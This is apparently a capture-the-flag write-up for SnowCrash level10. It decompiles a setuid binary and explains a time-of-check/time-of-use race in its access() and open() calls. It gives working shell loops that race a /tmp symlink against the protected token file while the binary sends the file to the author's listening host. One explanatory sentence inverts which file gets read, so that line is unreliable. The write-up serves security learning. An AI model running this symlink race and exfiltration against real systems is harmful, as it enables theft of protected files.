# writeup level10


After execute ls -la in level10 :

```
level10@SnowCrash:~$ ls -la
total 28
dr-xr-x---+ 1 level10 level10   140 Mar  6  2016 .
d--x--x--x  1 root    users     340 Aug 30  2015 ..
-r-x------  1 level10 level10   220 Apr  3  2012 .bash_logout
-r-x------  1 level10 level10  3518 Aug 30  2015 .bashrc
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-r-x------  1 level10 level10   675 Apr  3  2012 .profile
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```




After running binary ninja to reverse this binary :

![main](https://cdn.discordapp.com/attachments/1015186220227231825/1148990230909689946/image.png)
![main2](https://cdn.discordapp.com/attachments/1015186220227231825/1148990437391077406/image.png)


# Explain the code

The code appears to involve system calls like `connect` and `socket`, suggesting an attempt to read a file and transmit its contents to port 6969.

In this code, the initial step involves verifying file access permissions using the `access function`. The function checks whether the file specified in argv[1] (possibly represented by the variable var_1060) has READ access permissions, typically represented by the constant R_OK with a value of 4 in linux systems. If the specified file grants READ access, implying that the file is readable, the code proceeds to send its content to port 6969.

```
08048750      if (access(var_1060, 4) != 0)
0804874e      {
0804894d          var_1060 = "You don't have access to %s\n";
08048950          eax_27 = printf(var_1060, eax_5);
08048950      }
```

```
08048763          var_1060 = "Connecting to %s:6969 .. ";
08048766          printf(var_1060, eax_7);
08048770          var_1060 = stdout;
08048773          fflush(var_1060);
08048778          int32_t domain = 0;
08048780          int32_t type_1 = 1;
08048788          var_1060 = 2;
0804878f          int32_t fd = socket(var_1060, type_1, domain);
0804879f          int32_t addr = 0;
080487a5          int32_t var_14_1 = 0;
080487ac          int32_t var_10_1 = 0;
080487b3          int32_t var_c_1 = 0;
080487ba          addr = 2;
080487d0          char* cp;
080487d0          in_addr_t var_14_2 = inet_addr(cp);
080487e3          *(uint16_t*)((char*)addr)[2] = htons(0x1b39);
08048805          char const* const var_1048;
08048805          esp = &var_1048;
0804880d          int32_t var_101c;
0804880d          if (connect(fd, &addr, 0x10) == 0xffffffff)
0804880a          {
0804881c              var_1048 = "Unable to connect to host %s\n";
0804881f              printf(var_1048, var_101c);
08048824              var_1048 = 1;
0804882b              exit(var_1048);
0804882b              /* no return */
0804882b          }
08048830          size_t nbytes = 8;
08048838          char const* const buf = ".*( )*.\n";
08048844          char* var_1018;
08048844          var_1048 = var_1018;
0804884f          if (write(var_1048, buf, nbytes) == 0xffffffff)
0804884c          {
0804885e              var_1048 = "Unable to write banner to host %…";
08048861              printf(var_1048, var_101c);
08048866              var_1048 = 1;
0804886d              exit(var_1048);
0804886d              /* no return */
0804886d          }
```

We can test this by listen to port 6969  and send file 


![send](https://cdn.discordapp.com/attachments/1015186220227231825/1149020868383604806/image.png)

![r](https://cdn.discordapp.com/attachments/1015186220227231825/1149020867939016724/image.png)


# Exploit

In manual page of [access](https://linux.die.net/man/2/access) we have note with warrning:
```
Notes

Warning: Using `access()` to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it. For this reason, the use of this system call should be avoided. (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)

`access()` always dereferences symbolic links. If you need to check the permissions on a symbolic link, use faccessat(2) with the flag AT_SYMLINK_NOFOLLOW.
```
So according to the manual page of `access()`, employing `access()` before `open()` can create a security vulnerability known as TOCTOU (Time-of-Check Time-of-Use) or race condition. This vulnerability arises due to the brief time interval between checking the file's accessibility and subsequently opening it. Malicious actors may exploit this interval by altering the file's permissions or content between the `access()` check and the actual file operation (`open()`), potentially leading to unauthorized access or manipulation of the file.

More information about this vulnerability can be found in the Common Weakness Enumeration (CWE) entry number 367 (CWE-367). [CWE-367](https://cwe.mitre.org/data/definitions/367.html) specifically addresses the Time-of-Check Time-of-Use (TOCTOU) race condition.

We now understand that the `access()` function checks permissions based on the real user ID (RUID), while the `open()` function considers the effective user ID (EUID). In the case of a setuid program, where the effective user ID may temporarily change, the `open()` function checks permissions based on the elevated EUID, such as flag10 in our scenario. This introduces a potential security vulnerability known as a race condition, where an attacker may exploit the brief time window between the `access()` and `open()` calls.

The heightened risk in this context is due to the fact that an attacker could manipulate the file between the `access()` check and the subsequent `open()` call, effectively skipping the permission check performed by `access()` and gaining unauthorized access to the file. It's noteworthy that the use of filenames as parameters, rather than `file descriptors`, contributes to the vulnerability of this race condition



The exploit is as follows:


```
touch /tmp/r
while [ 1 ]
do
  rm -f /tmp/tok
  ln -s /home/user/level10/token /tmp/tok
  rm -f /tmp/tok
  ln -s /tmp/r /tmp/tok
done
```
Here, a file /tmp/r is created for reading, and a loop continuously removes and recreates a symbolic link named /tmp/tok. This link alternates between pointing to /home/user/level10/token and /tmp/r.

The trick is to run this loop and another loop:

```
while [ 1 ]
do
  /home/user/level10/level10 192.168.1.4 /tmp/tok
done
```
The IP address is specific to our machine. The intention is to exploit a race condition by manipulating the symbolic link /tmp/tok between the access check and the open() operation in the level10 program.

During the brief interval when /tmp/tok is removed and recreated with a link to /tmp/r, the level10 program is expected to read the contents of /tmp/r instead of /home/user/level10/token. This enables unauthorized access to the file's content, highlighting a security vulnerability in the program's file access mechanism.

now we can get token and we the token we can get flag10

![token](https://cdn.discordapp.com/attachments/1164485225875783701/1195106008855482529/image.png?ex=65b2c834&is=65a05334&hm=018a7f00ffd064396b3176926b1ada7b9c761dd3d482ca06035482594ed63a72&)